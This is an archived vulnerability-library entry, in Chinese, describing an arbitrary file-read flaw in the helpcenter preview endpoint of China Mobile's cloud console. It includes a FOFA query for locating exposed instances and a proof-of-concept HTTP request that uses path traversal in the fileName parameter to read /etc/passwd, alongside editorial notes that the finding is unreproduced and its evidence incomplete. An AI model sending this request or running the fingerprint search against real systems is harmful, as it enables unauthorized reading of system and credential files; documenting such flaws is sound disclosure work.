---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "中国移动云控制台preview存在任意文件读取"
product: "中国移动云控制台helpcenter服务"
record_type: "vulnerability"
document_type: "请求级漏洞摘要"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "preview fileName路径遍历；未说明产品部署分支、版本和认证"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8/%E4%B8%AD%E5%9B%BD%E7%A7%BB%E5%8A%A8%E4%BA%91%E6%8E%A7%E5%88%B6%E5%8F%B0preview%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
fofa: "body=\"op-login-static/favicon.ico\" || header=\"/oauth2/code/opgateway\""
source_url: "https://www.yuque.com/xiaokp7/ocvun2/sh18y2kvdy1ou9gn"
id: "vw-5bf514aed210fe7300541b24"
entity_id: "ve-5bf514aed210fe7300541b24"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 中国移动云控制台preview存在任意文件读取

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：中国移动云控制台helpcenter服务
- 文献类型：请求级漏洞摘要
- 版本、权限及部署边界：preview fileName路径遍历；未说明产品部署分支、版本和认证
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 实际云/Web服务不属桌面软件，产品范围只有名称
2. fofa字段只body=，正文包含完整两条件查询
3. Host为空且请求误标java，无响应/源码/修复依据，不能据无Cookie样例证明未授权
4. 任意文件读取受服务进程权限限制；需核验官方部署产品身份及版本，不以指纹充分认定厂商

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/sh18y2kvdy1ou9gn>
- 原文参考链接（未重新核验）：<https://github.com/wy876/POC>

### 归档技术正文

# 一、漏洞简介
中国移动云控制台是一套用于统一查看和管理移动云产品及服务的系统，移动云控制台存在文件任意下载漏洞，攻击者可利用此漏洞获取任意文件信息。

# 二、影响版本
+ 中国移动云控制台

# 三、资产测绘
+ fofa`body="op-login-static/favicon.ico" || header="/oauth2/code/opgateway"`
+ 特征


# 四、漏洞复现
```http
GET /api/query/helpcenter/api/v2/preview?fileName=../../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sh18y2kvdy1ou9gn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
